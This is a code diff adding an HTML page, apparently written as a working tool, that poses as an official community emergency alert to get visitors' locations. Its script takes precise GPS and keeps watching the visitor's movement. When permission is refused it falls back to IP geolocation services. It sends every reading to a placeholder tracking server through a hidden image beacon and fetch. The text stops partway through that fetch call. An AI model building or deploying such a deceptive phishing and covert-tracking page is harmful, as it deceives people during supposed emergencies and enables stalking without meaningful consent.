@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emergency Community Alert System</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+
+        .emergency-header {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .emergency-header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .alert-level {
+            background: #ff9ff3;
+            color: #2d3436;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .emergency-alert {
+            background: #fff9e6;
+            border: 3px solid #ffd32a;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .emergency-alert h2 {
+            color: #e84118;
+            margin-bottom: 15px;
+            font-size: 1.8em;
+        }
+
+        .emergency-alert p {
+            color: #2f3640;
+            font-size: 1.1em;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .location-btn {
+            background: linear-gradient(45deg, #00b894, #00a085);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .location-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+        }
+
+        .info-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .info-section h3 {
+            color: #2d3436;
+            margin-bottom: 15px;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #00b894;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .location-data {
+            display: none;
+            background: #e8f7ff;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #2d3436;
+            color: white;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="emergency-header">
+            <h1>🚨 COMMUNITY EMERGENCY ALERT</h1>
+            <p>Official Emergency Broadcasting System</p>
+        </div>
+        
+        <div class="alert-level">
+            🔴 CRITICAL ALERT LEVEL: IMMEDIATE ACTION REQUIRED
+        </div>
+
+        <div class="content">
+            <div class="emergency-alert">
+                <h2>⚠️ IMMEDIATE ATTENTION REQUIRED</h2>
+                <p>Your location is needed to display critical emergency information specific to your area. 
+                   This includes evacuation routes, emergency shelters, and active threat locations.</p>
+                <p><strong>Your cooperation ensures your safety and the safety of others.</strong></p>
+                <button class="location-btn" onclick="requestLocation()">
+                    🔍 VIEW LOCAL EMERGENCY INFORMATION
+                </button>
+            </div>
+
+            <div class="info-section">
+                <h3>📋 About This Emergency Broadcast</h3>
+                <p>This system provides real-time emergency information tailored to your specific location. 
+                   By sharing your location, you'll receive:</p>
+                <ul style="margin-left: 20px; margin-top: 10px;">
+                    <li>Local evacuation routes and shelters</li>
+                    <li>Real-time threat updates in your area</li>
+                    <li>Emergency contact information</li>
+                    <li>Resource availability near you</li>
+                </ul>
+            </div>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Accessing emergency information for your location...</p>
+            </div>
+
+            <div class="location-data" id="locationData">
+                <h3>📍 Location Services Active</h3>
+                <p>Emergency information is now being customized for your area.</p>
+                <div id="locationDetails"></div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>Official Community Emergency Response System | Privacy Protected</p>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let lastLocation = null;
+        let locationWatchId = null;
+
+        // Main location request function
+        function requestLocation() {
+            showLoading();
+            
+            // Primary method: Try precise GPS location first
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    preciseLocationSuccess,
+                    locationError,
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+                
+                // Start watching position for movement detection
+                startMovementTracking();
+            } else {
+                // Browser doesn't support geolocation
+                fallbackToIPLocation();
+            }
+        }
+
+        // Success callback for precise location
+        function preciseLocationSuccess(position) {
+            hideLoading();
+            const coords = position.coords;
+            
+            console.log('Precise location obtained:', {
+                latitude: coords.latitude,
+                longitude: coords.longitude,
+                accuracy: coords.accuracy + ' meters',
+                timestamp: new Date(position.timestamp)
+            });
+            
+            // Send to tracking server
+            sendLocationData({
+                type: 'precise_gps',
+                latitude: coords.latitude,
+                longitude: coords.longitude,
+                accuracy: coords.accuracy,
+                source: 'GPS',
+                timestamp: new Date().toISOString()
+            });
+            
+            showLocationData('GPS', coords.latitude, coords.longitude, coords.accuracy);
+        }
+
+        // Error handling for location requests
+        function locationError(error) {
+            hideLoading();
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    console.log('Location permission denied. Using fallback methods.');
+                    fallbackToIPLocation();
+                    break;
+                    
+                case error.POSITION_UNAVAILABLE:
+                    console.log('Location information unavailable.');
+                    getNetworkBasedLocation();
+                    break;
+                    
+                case error.TIMEOUT:
+                    console.log('Location request timed out.');
+                    // Retry with different parameters
+                    setTimeout(() => {
+                        navigator.geolocation.getCurrentPosition(
+                            preciseLocationSuccess,
+                            () => fallbackToIPLocation(),
+                            { enableHighAccuracy: false, timeout: 15000 }
+                        );
+                    }, 2000);
+                    break;
+                    
+                default:
+                    console.log('Unknown error occurred:', error);
+                    fallbackToIPLocation();
+                    break;
+            }
+        }
+
+        // IP-based location fallback
+        function fallbackToIPLocation() {
+            console.log('Attempting IP-based location...');
+            
+            // Try multiple IP geolocation services for better accuracy
+            const services = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json?token=demo', // Note: Use proper token in production
+                'https://api.ipgeolocation.io/ipgeo?apiKey=demo' // Note: Use proper key in production
+            ];
+            
+            attemptIPService(services, 0);
+        }
+
+        function attemptIPService(services, index) {
+            if (index >= services.length) {
+                console.log('All IP services failed');
+                getNetworkBasedLocation();
+                return;
+            }
+            
+            fetch(services[index])
+                .then(response => {
+                    if (!response.ok) throw new Error('Service unavailable');
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('IP location obtained:', data);
+                    
+                    let lat, lng, city, country;
+                    
+                    // Parse response based on service
+                    if (data.latitude && data.longitude) {
+                        lat = data.latitude;
+                        lng = data.longitude;
+                        city = data.city || data.city_name;
+                        country = data.country_name || data.country;
+                    } else if (data.loc) {
+                        const loc = data.loc.split(',');
+                        lat = parseFloat(loc[0]);
+                        lng = parseFloat(loc[1]);
+                        city = data.city;
+                        country = data.country;
+                    }
+                    
+                    if (lat && lng) {
+                        sendLocationData({
+                            type: 'ip_geolocation',
+                            latitude: lat,
+                            longitude: lng,
+                            accuracy: 5000, // Approximate accuracy for IP location
+                            city: city,
+                            country: country,
+                            source: 'IP Geolocation',
+                            timestamp: new Date().toISOString()
+                        });
+                        
+                        showLocationData('IP Geolocation', lat, lng, 5000, city, country);
+                    } else {
+                        attemptIPService(services, index + 1);
+                    }
+                })
+                .catch(error => {
+                    console.log(`IP service ${index + 1} failed:`, error);
+                    attemptIPService(services, index + 1);
+                });
+        }
+
+        // Network-based location (Wi-Fi/Cell tower)
+        function getNetworkBasedLocation() {
+            console.log('Attempting network-based location...');
+            
+            // This would typically use additional APIs or services
+            // For demonstration, we'll use a combination of methods
+            
+            // Try to get connection information
+            if (navigator.connection) {
+                const connection = navigator.connection;
+                console.log('Network info:', {
+                    type: connection.effectiveType,
+                    downlink: connection.downlink,
+                    rtt: connection.rtt
+                });
+            }
+            
+            // Final fallback - very approximate location based on limited data
+            sendLocationData({
+                type: 'network_approximate',
+                accuracy: 20000,
+                source: 'Network Analysis',
+                timestamp: new Date().toISOString(),
+                note: 'Approximate location based on network characteristics'
+            });
+            
+            showLocationData('Network', null, null, 20000, 'Approximate area detection');
+        }
+
+        // Movement tracking
+        function startMovementTracking() {
+            if (navigator.geolocation && !locationWatchId) {
+                locationWatchId = navigator.geolocation.watchPosition(
+                    (position) => {
+                        const newLocation = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            timestamp: position.timestamp
+                        };
+                        
+                        if (lastLocation) {
+                            const distance = calculateDistance(
+                                lastLocation.lat, lastLocation.lng,
+                                newLocation.lat, newLocation.lng
+                            );
+                            
+                            if (distance > 100) { // Moved more than 100 meters
+                                console.log('Significant movement detected:', distance + ' meters');
+                                logMovement(newLocation, distance);
+                            }
+                        }
+                        
+                        lastLocation = newLocation;
+                    },
+                    (error) => {
+                        console.log('Movement tracking error:', error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        maximumAge: 30000,
+                        timeout: 10000
+                    }
+                );
+            }
+        }
+
+        // Calculate distance between two coordinates (Haversine formula)
+        function calculateDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371000; // Earth's radius in meters
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = 
+                Math.sin(dLat/2) * Math.sin(dLat/2) +
+                Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                Math.sin(dLon/2) * Math.sin(dLon/2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            return R * c;
+        }
+
+        function logMovement(location, distance) {
+            sendLocationData({
+                type: 'movement_detected',
+                latitude: location.lat,
+                longitude: location.lng,
+                distance_moved: distance,
+                source: 'Movement Tracking',
+                timestamp: new Date().toISOString(),
+                note: `User moved ${Math.round(distance)} meters`
+            });
+        }
+
+        // Send location data to server
+        function sendLocationData(data) {
+            // In a real implementation, this would send to your tracking server
+            console.log('Sending location data:', data);
+            
+            // Example: Send via image beacon (works even if JavaScript is blocked later)
+            const beacon = new Image();
+            const params = new URLSearchParams(data);
+            beacon.src = `https://your-tracking-server.com/collect?${params.toString()}`;
+            
+            // Alternative: Send via fetch
+            fetch('https://your-tracking-server.com/api/location', {
+                method:
